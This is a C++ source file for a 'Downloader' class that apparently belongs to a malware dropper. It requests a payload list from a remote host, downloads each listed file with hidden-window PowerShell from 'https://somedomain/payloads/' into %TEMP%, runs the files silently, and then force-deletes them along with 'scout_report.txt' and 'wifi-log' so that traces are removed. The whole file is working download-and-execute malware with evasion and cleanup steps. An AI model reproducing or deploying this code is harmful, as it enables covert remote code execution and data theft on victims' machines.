#include "stdafx.h"
#include "Downloader.h"

Downloader::Downloader() {
	m_exceptions.push_back("sqlite3.dll");
}

Downloader::~Downloader() {}

bool Downloader::isInExceptions(std::string file) {
	for (std::vector<std::string>::size_type i = 0; i != m_exceptions.size(); ++i) {
		if (m_exceptions[i] == file)
			return true;
	}

	return false;
}

std::vector<std::string> Downloader::getPayloadsList() {

	try {
		std::string response = HTTPRequest::sendRequest("GET", Constants::URL_HOST.c_str(), Constants::URL_PAYLOADS_LIST.c_str(), NULL, NULL);
		std::vector<std::string> payloadsToDownload = StringUtils::split(response, '\n');

		Logger::addSection("Modules downloaded");
		for (std::vector<std::string>::size_type i = 0; i != payloadsToDownload.size(); ++i) {
			Logger::addEntry(payloadsToDownload[i]);
		}

		return payloadsToDownload;
	}

	catch (std::exception const& e) {
		Logger::addError(e.what());
	}

	return std::vector<std::string>();
}

void Downloader::dropExecute(std::vector<std::string> payloadsToDownload) {

	for (std::vector<std::string>::size_type i = 0; i != payloadsToDownload.size(); ++i) {

		std::string command = "powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('https://somedomain/payloads/" + payloadsToDownload[i] + "','%TEMP%\\" + payloadsToDownload[i] + "');";
		system(command.c_str());

		if (!isInExceptions(payloadsToDownload[i])) {
			std::string launchCommand = "powershell -windowstyle hidden Start-Process \"%TEMP%\\" + payloadsToDownload[i] + "\"";
			std::cout << launchCommand << std::endl;
			system(launchCommand.c_str());
		}
	}
}

void Downloader::cleanUp(std::vector<std::string> payloadsToDelete) {

	//delete all the files we downloaded and created
	payloadsToDelete.push_back("scout_report.txt");
	payloadsToDelete.push_back("wifi-log");

	for (std::vector<std::string>::size_type i = 0; i != payloadsToDelete.size(); ++i) {
		std::string command = "del /q /f %TEMP%\\" + payloadsToDelete[i];
		system(command.c_str());
	}


}
